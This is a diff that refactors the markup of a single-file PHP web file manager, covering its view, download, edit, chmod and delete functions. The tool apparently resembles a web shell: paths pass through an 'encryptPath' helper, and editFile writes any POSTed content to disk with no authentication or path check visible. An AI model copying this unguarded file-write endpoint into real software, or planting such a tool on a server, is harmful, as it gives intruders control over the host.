-        echo '<a href="#" onclick="showChmodModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', \'' . substr(sprintf('%o', fileperms($fullPath)), -4) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-2 text-primary hover:bg-surface-container-high rounded-lg transition-colors" title="Permissions">';
-        echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></a>';
-
-        echo '<a href="#" onclick="showDeleteModal(' . htmlspecialchars(json_encode($item)) . ', \'' . encryptPath($fullPath) . '\', ' . ($isDir ? 'true' : 'false') . '); return false;" class="p-2 text-error hover:bg-surface-container-high rounded-lg transition-colors" title="Delete">';
-        echo '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg></a>';
-
-        echo '</div></div>';
-        echo '</div>';
+        echo '<div class="text-sm">' . getPerms($fullPath) . '</div><div class="flex items-center gap-2">';
+        if (!$isDir)
+            echo $actionBtn('download', $fullPath, $item, $isDir, '5') . $actionBtn('edit', $fullPath, $item, $isDir, '5');
+        echo $actionBtn('rename', $fullPath, $item, $isDir, '5') . $actionBtn('chmod', $fullPath, $item, $isDir, '5') . $actionBtn('delete', $fullPath, $item, $isDir, '5');
+        echo '</div></div></div>';
     }
-
-    echo '</div>'; // End mobile view
+    echo '</div>';
 
     // Empty state
     echo '<div id="emptyState" class="hidden py-12 text-center">';
-    echo '<div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-surface-container mb-4">';
-    echo '<svg class="h-8 w-8 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.172 16.172a4 4 0 015.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
-    echo '</div>';
-    echo '<h3 class="text-lg font-medium text-on-surface mb-1">No files found</h3>';
-    echo '<p class="text-on-surface-variant">Try adjusting your search</p>';
+    echo '<div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-surface-container mb-4"><svg class="h-8 w-8 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.172 16.172a4 4 0 015.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>';
+    echo '<h3 class="text-lg font-medium text-on-surface mb-1">No files found</h3><p class="text-on-surface-variant">Try adjusting your search</p></div>';
     echo '</div>';
 
-    echo '</div>'; // End container
-
-    // Get the buffered content
     return ob_get_clean();
 }
 
@@ -328,57 +229,37 @@ function showAlert(string $message, string $type = 'success'): void
 function viewFile(string $file): void
 {
     $content = htmlspecialchars(file_get_contents($file));
+    $enc = encryptPath($file);
+    $dirEnc = encryptPath(dirname($file));
+    $name = htmlspecialchars(basename($file));
+    $path = htmlspecialchars($file);
+    $btnPrimary = 'flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium';
+    $btnSecondary = 'flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium';
 
-    echo '<div class="max-w-6xl mx-auto">';
-    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';
+    echo '<div class="max-w-6xl mx-auto"><div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';
 
     // Header
     echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
     echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
-    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
-    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>';
-    echo '</div>';
-    echo '<span class="truncate">' . htmlspecialchars(basename($file)) . '</span>';
-    echo '</h2>';
-    echo '</div>';
+    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3"><svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg></div>';
+    echo "<span class=\"truncate\">$name</span></h2></div>";
 
-    // File info section
+    // File info
     echo '<div class="px-4 sm:px-6 py-3 bg-surface-container-low border-b border-outline-variant">';
-    echo '<div class="text-on-surface-variant font-mono text-xs break-all mb-2">' . htmlspecialchars($file) . '</div>';
+    echo "<div class=\"text-on-surface-variant font-mono text-xs break-all mb-2\">$path</div>";
     echo '<div class="flex flex-wrap items-center gap-x-4 gap-y-1 text-xs text-on-surface-variant">';
-    echo '<span>' . formatSize(filesize($file)) . '</span>';
-    echo '<span>' . getPerms($file) . '</span>';
-    echo '<span>' . date("Y-m-d H:i:s", filemtime($file)) . '</span>';
-    echo '</div>';
-    echo '</div>';
+    echo '<span>' . formatSize(filesize($file)) . '</span><span>' . getPerms($file) . '</span><span>' . date("Y-m-d H:i:s", filemtime($file)) . '</span>';
+    echo '</div></div>';
 
-    // File content
-    echo '<div class="p-4 sm:p-6">';
-    echo '<pre class="bg-surface-container-highest text-on-surface p-4 rounded-xl overflow-auto max-h-[50vh] sm:max-h-[60vh] font-mono text-xs sm:text-sm leading-relaxed scrollbar-thin">' . $content . '</pre>';
-    echo '</div>';
+    // Content
+    echo "<div class=\"p-4 sm:p-6\"><pre class=\"bg-surface-container-highest text-on-surface p-4 rounded-xl overflow-auto max-h-[50vh] sm:max-h-[60vh] font-mono text-xs sm:text-sm leading-relaxed scrollbar-thin\">$content</pre></div>";
 
     // Actions
     echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
-    echo '<a href="?action=edit&file=' . encryptPath($file) . '" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg>';
-    echo '<span class="hidden sm:inline">Edit</span>';
-    echo '<span class="sm:hidden">Edit</span>';
-    echo '</a>';
-
-    echo '<a href="?download=' . encryptPath($file) . '" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>';
-    echo '<span class="hidden sm:inline">Download</span>';
-    echo '<span class="sm:hidden">Save</span>';
-    echo '</a>';
-
-    echo '<a href="?cd=' . encryptPath(dirname($file)) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path></svg>';
-    echo 'Back';
-    echo '</a>';
-    echo '</div>';
-
-    echo '</div>';
-    echo '</div>';
+    echo "<a href=\"?action=edit&file=$enc\" class=\"$btnPrimary\"><svg class=\"h-5 w-5 mr-2\" fill=\"none\" stroke=\"currentColor\" viewBox=\"0 0 24 24\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" d=\"M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z\"/></svg>Edit</a>";
+    echo "<a href=\"?download=$enc\" class=\"$btnPrimary\"><svg class=\"h-5 w-5 mr-2\" fill=\"none\" stroke=\"currentColor\" viewBox=\"0 0 24 24\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" d=\"M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4\"/></svg>Download</a>";
+    echo "<a href=\"?cd=$dirEnc\" class=\"$btnSecondary\"><svg class=\"h-5 w-5 mr-2\" fill=\"none\" stroke=\"currentColor\" viewBox=\"0 0 24 24\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" d=\"M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z\"/></svg>Back</a>";
+    echo '</div></div></div>';
 }
 
 function downloadFile(string $file): void
@@ -392,7 +273,7 @@ function downloadFile(string $file): void
         header('Cache-Control: must-revalidate');
         header('Pragma: public');
         header('Content-Length: ' . filesize($file));
-        flush(); // Flush system output buffer
+        flush();
         readfile($file);
         exit;
     }
@@ -402,60 +283,36 @@ function editFile(string $file): void
 {
     $dirname = dirname($file);
 
-    // Store original action and file parameters
-    $action = isset($_GET['action']) ? $_GET['action'] : '';
-    $fileParam = isset($_GET['file']) ? $_GET['file'] : '';
-
-    // Process the form submission
     if (isset($_POST['content'])) {
         file_put_contents($file, $_POST['content']);
-        // Instead of redirecting, just reset the POST data
-        $_POST = array();
-        // Display success alert and file manager
+        $_POST = [];
         showAlert("File saved successfully!", "success");
         fileManager($dirname);
         return;
     }
 
-    // Show edit form
     $content = htmlspecialchars(file_get_contents($file));
+    $name = htmlspecialchars(basename($file));
+    $dirEnc = encryptPath($dirname);
+    $btnPrimary = 'flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium';
+    $btnSecondary = 'flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium';
 
-    echo '<div class="max-w-6xl mx-auto">';
-    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';
+    echo '<div class="max-w-6xl mx-auto"><div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';
 
     // Header
     echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
     echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
-    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
-    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg>';
-    echo '</div>';
-    echo '<span class="truncate">Editing: ' . htmlspecialchars(basename($file)) . '</span>';
-    echo '</h2>';
-    echo '</div>';
+    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3"><svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg></div>';
+    echo "<span class=\"truncate\">Editing: $name</span></h2></div>";
 
     echo '<form method="post">';
-
-    // Textarea
-    echo '<div class="p-4 sm:p-6">';
-    echo '<textarea name="content" rows="20" class="w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y" style="min-height: 300px;">' . $content . '</textarea>';
-    echo '</div>';
+    echo "<div class=\"p-4 sm:p-6\"><textarea name=\"content\" rows=\"20\" class=\"w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y\" style=\"min-height: 300px;\">$content</textarea></div>";
 
     // Actions
     echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
-    echo '<button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
-    echo 'Save Changes';
-    echo '</button>';
-
-    echo '<a href="?cd=' . encryptPath($dirname) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
-    echo 'Cancel';
-    echo '</a>';
-    echo '</div>';
-
-    echo '</form>';
-    echo '</div>';
-    echo '</div>';
+    echo "<button type=\"submit\" class=\"$btnPrimary\"><svg class=\"h-5 w-5 mr-2\" fill=\"none\" stroke=\"currentColor\" viewBox=\"0 0 24 24\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" d=\"M5 13l4 4L19 7\"/></svg>Save Changes</button>";
+    echo "<a href=\"?cd=$dirEnc\" class=\"$btnSecondary\"><svg class=\"h-5 w-5 mr-2\" fill=\"none\" stroke=\"currentColor\" viewBox=\"0 0 24 24\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" d=\"M6 18L18 6M6 6l12 12\"/></svg>Cancel</a>";
+    echo '</div></form></div></div>';
 }
 
 function newFile(string $dir): void
